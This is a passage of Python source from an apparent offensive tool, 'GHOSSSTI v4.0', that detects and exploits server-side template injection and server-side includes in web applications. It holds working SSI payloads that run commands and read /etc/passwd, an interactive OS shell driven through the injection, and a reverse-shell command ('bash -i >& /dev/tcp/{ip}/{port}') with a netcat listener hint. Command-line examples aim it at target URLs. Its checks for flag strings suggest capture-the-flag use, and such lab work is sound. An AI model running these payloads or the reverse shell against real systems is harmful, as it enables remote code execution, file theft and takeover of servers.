    def test_ssi_vulnerability(self, param: str) -> bool:
        """Test for SSI vulnerability with comprehensive tests"""
        print(f"{Fore.CYAN}[*] Testing SSI payloads:{Style.RESET_ALL}\n")
        
        ssi_detected = False
        test_results = []
        
        # Test all SSI payloads
        for category, tests in self.ssi_tests.items():
            print(f"  {Fore.WHITE}[*] Testing {category}...{Style.RESET_ALL}")
            for payload, expected, vuln_type in tests:
                response = self.make_request(payload, param)
                
                if response and re.search(expected, response, re.IGNORECASE):
                    # Make sure it's not just echoing the payload
                    if payload not in response or len(payload) < 20:
                        print(f"    {Fore.GREEN}[✓] SSI WORKS: {payload[:60]}...{Style.RESET_ALL}")
                        test_results.append((category, payload, True))
                        ssi_detected = True
                    else:
                        print(f"    {Fore.YELLOW}[-] Payload echoed: {payload[:60]}...{Style.RESET_ALL}")
                        test_results.append((category, payload, False))
                else:
                    print(f"    {Fore.RED}[✗] No match: {payload[:60]}...{Style.RESET_ALL}")
                    test_results.append((category, payload, False))
        
        # Print summary
        print(f"\n{Fore.CYAN}[*] SSI Detection Summary:{Style.RESET_ALL}")
        working_tests = [t for t in test_results if t[2]]
        failed_tests = [t for t in test_results if not t[2]]
        
        if working_tests:
            print(f"  {Fore.GREEN}[+] Working SSI payloads: {len(working_tests)}{Style.RESET_ALL}")
            for category, payload, _ in working_tests:
                print(f"    {Fore.GREEN}✓{Style.RESET_ALL} {category}: {payload[:60]}...")
        
        if failed_tests:
            print(f"  {Fore.YELLOW}[!] Failed tests: {len(failed_tests)}{Style.RESET_ALL}")
        
        return ssi_detected

    def detect_ssi_capabilities(self):
        """Detect SSI capabilities"""
        print(f"\n{Fore.YELLOW}[*] Detecting SSI capabilities...{Style.RESET_ALL}")
        
        # Test command execution
        test_cmd = "<!--#exec cmd=\"echo SSI_CMD_TEST\" -->"
        response = self.make_request(test_cmd, self.vulnerable_param)
        
        if response and "SSI_CMD_TEST" in response:
            self.capabilities['shell_cmd'] = True
            print(f"{Fore.GREEN}  [+] SSI command execution: OK{Style.RESET_ALL}")
        else:
            self.capabilities['shell_cmd'] = False
            print(f"{Fore.YELLOW}  [-] SSI command execution: Failed{Style.RESET_ALL}")
        
        # Test file inclusion
        test_include = "<!--#include virtual=\"/etc/passwd\" -->"
        response = self.make_request(test_include, self.vulnerable_param)
        
        if response and "root:" in response:
            self.capabilities['file_read'] = True
            print(f"{Fore.GREEN}  [+] SSI file inclusion: OK{Style.RESET_ALL}")
        else:
            self.capabilities['file_read'] = False
            print(f"{Fore.YELLOW}  [-] SSI file inclusion: Failed{Style.RESET_ALL}")
        
        self.capabilities['file_write'] = False
        
        print(f"\n{Fore.CYAN}[+] SSI vulnerability confirmed:{Style.RESET_ALL}")
        print(f"\n  {Fore.WHITE}Parameter: {self.vulnerable_param}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Type: Server-Side Includes (SSI){Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Capabilities:{Style.RESET_ALL}")
        print(f"    {Fore.GREEN if self.capabilities.get('shell_cmd') else Fore.RED}Command execution: {'OK' if self.capabilities.get('shell_cmd') else 'NO'}{Style.RESET_ALL}")
        print(f"    {Fore.GREEN if self.capabilities.get('file_read') else Fore.RED}File inclusion: {'OK' if self.capabilities.get('file_read') else 'NO'}{Style.RESET_ALL}")

    def identify_engine_verified(self, param: str) -> Optional[str]:
        """Identify template engine"""
        scores = {}
        
        for engine, tests in self.engine_tests.items():
            score = 0
            matches = []
            
            for payload, expected, check_type in tests:
                response = self.make_request(payload, param)
                
                if self.is_payload_executed(response, payload, expected, check_type):
                    score += 1
                    matches.append(payload)
            
            if score > 0:
                scores[engine] = {
                    'score': score,
                    'matches': matches,
                    'total_tests': len(tests),
                    'confidence': (score / len(tests)) * 100
                }
        
        if not scores:
            return None
        
        sorted_engines = sorted(scores.items(), 
                                key=lambda x: (x[1]['score'], x[1]['confidence']), 
                                reverse=True)
        
        print(f"{Fore.CYAN}[*] Detection Results:{Style.RESET_ALL}")
        for engine, data in sorted_engines[:5]:
            score = data['score']
            total = data['total_tests']
            conf = data['confidence']
            
            marker = "✓✓✓" if score >= 5 else "✓✓" if score >= 3 else "✓"
            color = Fore.GREEN if score >= 5 else Fore.YELLOW if score >= 3 else Fore.RED
            
            print(f"  {color}{marker} {engine}: {score}/{total} tests passed ({conf:.0f}% confidence){Style.RESET_ALL}")
        
        best_engine = sorted_engines[0][0]
        best_data = sorted_engines[0][1]
        
        print(f"\n{Fore.GREEN}[+] Engine CONFIRMED: {best_engine}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Tests Passed: {best_data['score']}/{best_data['total_tests']} ({best_data['confidence']:.0f}% confidence){Style.RESET_ALL}")
        
        return best_engine

    def detect_capabilities(self):
        """Detect capabilities"""
        print(f"\n{Fore.YELLOW}[*] Detecting capabilities...{Style.RESET_ALL}")
        
        # Test command execution with multiple simple tests
        test_commands = [
            ("echo GHOSSSTI_TEST", "GHOSSSTI_TEST"),
            ("id", "uid="),
            ("whoami", "root|www-data|nginx|apache|user"),
        ]
        
        cmd_works = False
        for test_cmd, expected in test_commands:
            if self.test_command_silent(test_cmd, expected):
                self.capabilities['shell_cmd'] = True
                cmd_works = True
                print(f"{Fore.GREEN}  [+] Shell command execution: OK (tested: {test_cmd}){Style.RESET_ALL}")
                if self.working_payload_template:
                    # Show which payload works (truncated for readability)
                    template_preview = self.working_payload_template.replace("{CMD}", "CMD")[:60]
                    print(f"{Fore.CYAN}  [+] Working payload: {template_preview}...{Style.RESET_ALL}")
                self.detect_os()
                break
        
        if not cmd_works:
            self.capabilities['shell_cmd'] = False
            print(f"{Fore.YELLOW}  [-] Shell command execution: Failed{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}  [!] Note: Some RCE methods may still work. Try interactive mode.{Style.RESET_ALL}")
        
        self.capabilities['file_read'] = False
        self.capabilities['file_write'] = False
        
        print(f"\n{Fore.CYAN}[+] SSTImap identified the following injection point:{Style.RESET_ALL}")
        print(f"\n  {Fore.WHITE}Parameter: {self.vulnerable_param}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}OS: {self.os_type or 'unknown'}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Capabilities:{Style.RESET_ALL}")
        print(f"    {Fore.GREEN if self.capabilities.get('shell_cmd') else Fore.YELLOW}Shell command execution: {'OK' if self.capabilities.get('shell_cmd') else 'Uncertain (try anyway)'}{Style.RESET_ALL}")

    def test_command_silent(self, cmd: str, expected_output: str) -> bool:
        """Test command silently and store working payload template"""
        if not self.detected_engine or not self.vulnerable_param:
            return False
        
        if self.detected_engine not in self.rce_payloads:
            return False
        
        payloads = self.rce_payloads[self.detected_engine]
        
        # Try each payload template
        for template in payloads:
            payload = template.replace("{CMD}", cmd)
            response = self.make_request(payload, self.vulnerable_param)
            
            if response and expected_output.lower() in response.lower():
                # Store the working template for future use
                self.working_payload_template = template
                return True
        
        return False

    def detect_os(self):
        """Detect OS"""
        if self.test_command_silent("uname", "Linux"):
            self.os_type = "posix-linux"
        elif self.test_command_silent("uname", "Darwin"):
            self.os_type = "posix-darwin"
        else:
            self.os_type = "unknown"

    def find_parameters(self) -> List[str]:
        """Find test parameters"""
        params = []
        parsed = urlparse(self.url)
        if parsed.query:
            params.extend(parse_qs(parsed.query).keys())
        if self.data:
            params.extend(self.data.keys())
        if not params:
            params = ['name', 'user', 'search', 'q', 'template']
        return params

    def execute_command(self, command: str, debug: bool = False) -> Optional[str]:
        """Execute command"""
        # SSI mode
        if self.detected_engine == "SSI":
            payload = f"<!--#exec cmd=\"{command}\" -->"
            if debug:
                print(f"{Fore.DARK_GREY}[DEBUG] Testing SSI payload: {payload}{Style.RESET_ALL}")
            response = self.make_request(payload, self.vulnerable_param)
            if response and response != self.baseline_response:
                return response
            return None
        
        # SSTI mode - always try all payloads for accuracy
        payloads = self.rce_payloads.get(self.detected_engine, [])
        
        if not payloads:
            return None
        
        cmd_lower = command.lower().strip()
        cmd_parts = cmd_lower.split()
        cmd_base = cmd_parts[0] if cmd_parts else cmd_lower
        
        # For Twig, escape spaces with \x20 for better compatibility
        if self.detected_engine == "Twig":
            # Use raw string replacement - literally the 4 characters: \ x 2 0
            command_encoded = command.replace(' ', r'\x20')
        else:
            command_encoded = command
        
        if debug:
            print(f"{Fore.DARK_GREY}[DEBUG] Original command: {command}{Style.RESET_ALL}")
            print(f"{Fore.DARK_GREY}[DEBUG] Encoded command: {command_encoded}{Style.RESET_ALL}")
            print(f"{Fore.DARK_GREY}[DEBUG] Testing {len(payloads)} payloads...{Style.RESET_ALL}")
        
        for idx, template in enumerate(payloads, 1):
            payload = template.replace("{CMD}", command_encoded)
            
            if debug:
                print(f"{Fore.DARK_GREY}[DEBUG] [{idx}/{len(payloads)}] Payload: {payload[:100]}...{Style.RESET_ALL}")
            
            response = self.make_request(payload, self.vulnerable_param)
            
            if not response or response == self.baseline_response:
                if debug:
                    print(f"{Fore.DARK_GREY}[DEBUG] [{idx}/{len(payloads)}] No change in response{Style.RESET_ALL}")
                continue
            
            response_lower = response.lower()
            
            # Check for command-specific output
            found_match = False
            
            # For 'id' command
            if 'id' == cmd_base and 'uid=' in response_lower:
                found_match = True
            
            # For 'whoami' command
            elif 'whoami' == cmd_base and any(u in response_lower for u in ['root', 'www-data', 'nginx', 'apache', 'user']):
                found_match = True
            
            # For 'ls' or 'dir' command
            elif cmd_base in ['ls', 'dir']:
                # If response changed at all, it probably worked
                if response != self.baseline_response:
                    # Check for typical file/directory indicators
                    if any(i in response_lower for i in [
                        'total ', 'drwx', '-rw-', '-r--',  # ls -l format
                        '.txt', '.php', '.html', '.js', '.json', '.py', '.sh',  # files
                        '.lock', '.md', '.yml', '.yaml', '.xml', '.conf',  # more files
                        'vendor', 'composer', 'node_modules', 'src', 'public',  # directories
                        'bin', 'etc', 'var', 'usr', 'home', 'tmp', 'opt',  # system dirs
                    ]):
                        found_match = True
                    # Or if response changed significantly
                    elif abs(len(response) - len(self.baseline_response)) > 20:
                        found_match = True
            
            # For 'cat', 'type', 'head', 'tail' commands
            elif cmd_base in ['cat', 'type', 'head', 'tail', 'more', 'less']:
                # If response changed at all, it probably worked
                if response != self.baseline_response:
                    # Check if it's significantly different
                    if abs(len(response) - len(self.baseline_response)) > 10:
                        found_match = True
                    # Or contains typical file content indicators
                    elif any(indicator in response_lower for indicator in [
                        'htb{', 'flag{', 'ctf{',  # flags
                        '<?php', '#!/', 'import ', 'function',  # code
                        'root:', '/bin/', '/usr/',  # file paths
                        '# ', '## ', '/*',  # comments
                    ]):
                        found_match = True
            
            # For 'pwd' command
            elif 'pwd' == cmd_base and ('/' in response_lower or '\\' in response_lower or 'var' in response_lower or 'www' in response_lower):
                found_match = True
            
            # For 'echo' command
            elif 'echo' == cmd_base:
                # Extract what we're echoing
                echo_parts = command.split('echo', 1)
                if len(echo_parts) > 1:
                    echo_text = echo_parts[1].strip().strip('"').strip("'").lower()
                    if echo_text and (echo_text in response_lower or echo_text[:10] in response_lower):
                        found_match = True
                elif len(response) != len(self.baseline_response):
                    found_match = True
            
            # For 'hostname' command
            elif 'hostname' == cmd_base and len(response) > len(self.baseline_response):
                found_match = True
            
            # For 'uname' command
            elif 'uname' == cmd_base and ('linux' in response_lower or 'darwin' in response_lower or 'unix' in response_lower):
                found_match = True
            
            # For 'find' command
            elif 'find' == cmd_base and ('/' in response_lower or abs(len(response) - len(self.baseline_response)) > 30):
                found_match = True
            
            # For 'grep' command
            elif 'grep' == cmd_base and len(response) != len(self.baseline_response):
                found_match = True
            
            # Generic check - if response changed at all from baseline, command worked
            elif response != self.baseline_response:
                found_match = True
            
            if found_match:
                self.working_payload_template = template  # Cache for next time
                # Store the actual payload used for display
                self.last_payload = payload
                if debug:
                    print(f"{Fore.GREEN}[DEBUG] [{idx}/{len(payloads)}] SUCCESS! Payload worked{Style.RESET_ALL}")
                return response
            elif debug:
                print(f"{Fore.YELLOW}[DEBUG] [{idx}/{len(payloads)}] Response changed but didn't match criteria{Style.RESET_ALL}")
        
        if debug:
            print(f"{Fore.RED}[DEBUG] All {len(payloads)} payloads failed{Style.RESET_ALL}")
        return None

    def os_shell(self):
        """Interactive shell"""
        if not self.capabilities.get('shell_cmd'):
            print(f"{Fore.YELLOW}[!] Shell command execution detection failed, but trying anyway...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Some payloads may still work even if detection failed{Style.RESET_ALL}\n")
        else:
            print(f"\n{Fore.GREEN}[+] Run commands on the operating system{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}[*] TIP: Type 'payload' to see the last used payload{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] TIP: Type 'debug' to toggle debug mode{Style.RESET_ALL}\n")
        prompt = f"{self.os_type or 'shell'} $ "
        debug_mode = False
        
        while True:
            try:
                cmd = input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL}").strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                
                # Toggle debug mode
                if cmd.lower() == 'debug':
                    debug_mode = not debug_mode
                    status = "ON" if debug_mode else "OFF"
                    print(f"{Fore.YELLOW}[*] Debug mode: {status}{Style.RESET_ALL}")
                    continue
                
                # Show last payload
                if cmd.lower() == 'payload':
                    if self.last_payload:
                        print(f"\n{Fore.YELLOW}[*] Last successful payload:{Style.RESET_ALL}")
                        print(f"{Fore.WHITE}{self.last_payload}{Style.RESET_ALL}\n")
                    else:
                        print(f"{Fore.YELLOW}[!] No payload used yet{Style.RESET_ALL}")
                    continue
                
                result = self.execute_command(cmd, debug=debug_mode)
                if result:
                    output = self.extract_output(result)
                    print(output)
                    # Show payload on successful command (if not in debug mode, as debug shows more detail)
                    if not debug_mode and hasattr(self, 'last_payload') and self.last_payload:
                        print(f"{Fore.YELLOW}[Payload: {self.last_payload[:100]}...]{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] Command failed or no output{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Exiting shell...{Style.RESET_ALL}")
                break
            except EOFError:
                break

    def extract_output(self, response: str) -> str:
        """Extract command output from response, handling JSON and HTML"""
        if not response:
            return ""
        
        # Try to parse as JSON first (common in API responses)
        try:
            import json
            data = json.loads(response)
            
            # Check common JSON fields that might contain output
            output_parts = []
            for field in ['id', 'result', 'output', 'data', 'response', 'content', 'message', 'value', 'text']:
                if field in data:
                    value = str(data[field])
                    # Remove "Array" suffix that Twig adds
                    value = re.sub(r'\s*Array\s*$', '', value, flags=re.IGNORECASE | re.MULTILINE)
                    value = value.strip()
                    if value and len(value) > 0:
                        # Check if this looks like actual command output (not just metadata)
                        if not (value.isdigit() and len(value) < 5):  # Skip small numbers
                            output_parts.append(value)
            
            if output_parts:
                return '\n'.join(output_parts)
            
            # If no specific field, return the whole JSON pretty-printed
            return json.dumps(data, indent=2)
        except (json.JSONDecodeError, ValueError, TypeError):
            pass
        
        # Not JSON, try HTML extraction
        text = re.sub(r'<[^>]+>', '\n', response)
        lines = text.split('\n')
        output_lines = []
        
        # Filter out common noise
        noise_patterns = [
            'simple test server',
            'your ip:',
            'current time:',
            '<!DOCTYPE',
            '<html',
            '</html>',
            '<head',
            '</head>',
            '<body',
            '</body>',
        ]
        
        for line in lines:
            line = line.strip()
            if line and not any(noise.lower() in line.lower() for noise in noise_patterns):
                output_lines.append(line)
        
        if output_lines:
            result = '\n'.join(output_lines[:50])
            # Clean up common artifacts
            result = re.sub(r'^Hi\s+', '', result)
            result = re.sub(r'\s*Array!\s*$', '', result, flags=re.IGNORECASE)
            result = re.sub(r'\s*Array\s*$', '', result, flags=re.IGNORECASE)
            return result.strip() if result else response[:1000]
        
        return response[:1000]

    def interactive_mode(self):
        """Interactive mode"""
        if not self.detected_engine:
            print(f"{Fore.RED}[!] No vulnerability detected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}╔═══════════════════════════════════════╗")
        print(f"║     Interactive Exploitation          ║")
        print(f"╚═══════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Parameter: {self.vulnerable_param}{Style.RESET_ALL}\n")
        
        if self.capabilities.get('shell_cmd'):
            print(f"{Fore.YELLOW}[*] Use 'os-shell' to get interactive OS command shell{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Available Commands:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}os-shell{Style.RESET_ALL}          - Interactive OS shell")
        print(f"  {Fore.CYAN}os-cmd <cmd>{Style.RESET_ALL}      - Execute single command")
        print(f"  {Fore.CYAN}shell <ip> <port>{Style.RESET_ALL} - Reverse shell")
        print(f"  {Fore.CYAN}test <payload>{Style.RESET_ALL}    - Test custom payload")
        print(f"  {Fore.CYAN}quit{Style.RESET_ALL}              - Exit\n")
        
        while True:
            try:
                inp = input(f"{Fore.MAGENTA}GHOSSSTI>{Style.RESET_ALL} ").strip()
                
                if not inp:
                    continue
                
                if inp.lower() in ['quit', 'exit', 'q']:
                    break
                
                parts = inp.split(maxsplit=1)
                cmd = parts[0].lower()
                
                if cmd == 'os-shell':
                    self.os_shell()
                
                elif cmd == 'os-cmd' and len(parts) > 1:
                    result = self.execute_command(parts[1])
                    if result:
                        output = self.extract_output(result)
                        print(output)
                
                elif cmd == 'shell' and len(inp.split()) >= 3:
                    shell_parts = inp.split()
                    ip = shell_parts[1]
                    port = shell_parts[2]
                    shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
                    print(f"{Fore.YELLOW}[!] Ensure listener: nc -lvnp {port}{Style.RESET_ALL}")
                    self.execute_command(shell_cmd)
                
                elif cmd == 'test' and len(parts) > 1:
                    payload = parts[1]
                    response = self.make_request(payload, self.vulnerable_param)
                    output = self.extract_output(response)
                    print(f"{Fore.CYAN}Response:{Style.RESET_ALL}\n{output}")
                
                else:
                    print(f"{Fore.RED}Unknown command{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Use 'quit' to exit{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="GHOSSSTI v4.0 - Unified SSTI/SSI/XSLT Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # SCANNER MODE - Discover vulnerabilities
  %(prog)s --scan -u "http://target.com/page"
  
  # EXPLOITATION MODE - Exploit known vulnerability
  %(prog)s -u "http://target.com/page" -p "name" --os-shell
  
  # Two-endpoint SSTI
  %(prog)s -u "http://target.com/order" -p "card_name" -m POST --trigger-url "http://target.com/receipt/1002"
  
  # SSI mode
  %(prog)s -u "http://target.com/page.shtml" -p "name" --ssi-mode --os-shell
        """
    )
    
    # Mode selection
    parser.add_argument('--scan', action='store_true', help='Scanner mode: discover vulnerabilities')
    
    # Basic options
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--parameter', help='Parameter to test (exploitation mode)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('-d', '--data', help='POST data (key=value&key2=value2)')
    parser.add_argument('--inject-point', action='store_true', 
                       help='Use *INJECT* placeholder in data (e.g., -d "api=http://url/*INJECT*")')
    parser.add_argument('-H', '--headers', help='Headers')
    parser.add_argument('-c', '--cookies', help='Cookies')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--timeout', type=int, default=15)
    
    # Two-endpoint support
    parser.add_argument('--trigger-url', help='Trigger URL for two-endpoint SSTI')
    parser.add_argument('--trigger-method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('--trigger-data', help='Trigger URL POST data')
    
    # Exploitation modes
    parser.add_argument('--ssi-mode', action='store_true', help='SSI exploitation mode')
    parser.add_argument('--xslt-mode', action='store_true', help='XSLT exploitation mode')
    parser.add_argument('--os-shell', action='store_true', help='Interactive OS shell')
    parser.add_argument('--os-cmd', help='Execute OS command')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    
    args = parser.parse_args()
    
    # Parse data
    data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                data[k] = v
    
    # Parse headers
    headers = {}
    if args.headers:
        for line in args.headers.split('\\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
    
    # Parse cookies
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                k, v = cookie.split('=', 1)
                cookies[k.strip()] = v.strip()
    
    # Parse trigger data
    trigger_data = {}
    if args.trigger_data:
        for pair in args.trigger_data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                trigger_data[k] = v
    
    # Create scanner/exploiter
    tool = GhossSSTI(
        url=args.url,
        parameter=args.parameter,
        method=args.method,
        data=data,
        headers=headers,
        cookies=cookies,
        proxy=args.proxy,
        timeout=args.timeout,
        trigger_url=args.trigger_url,
        trigger_method=args.trigger_method,
        trigger_data=trigger_data if trigger_data else None,
        scan_mode=args.scan,
        ssi_mode=args.ssi_mode,
        xslt_mode=args.xslt_mode,
        injection_point=args.inject_point if hasattr(args, 'inject_point') else None
    )
    
    tool.print_banner()
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Scanner mode
    if args.scan:
        tool.scan_all_vulnerabilities()
        sys.exit(0)
    
    # Exploitation mode
    if not args.parameter:
        print(f"{Fore.RED}[!] Parameter required for exploitation mode. Use --scan to discover vulnerabilities.{Style.RESET_ALL}")
        sys.exit(1)
    
    vuln, engine, param = tool.detect_ssti()
    
    if not vuln:
        sys.exit(1)
    
    if args.os_shell:
        tool.os_shell()
    elif args.os_cmd:
        result = tool.execute_command(args.os_cmd)
        if result:
            output = tool.extract_output(result)
            print(f"\n{output}")
    elif args.interactive:
        tool.interactive_mode()
    else:
        tool.interactive_mode()


if __name__ == "__main__":
    main()
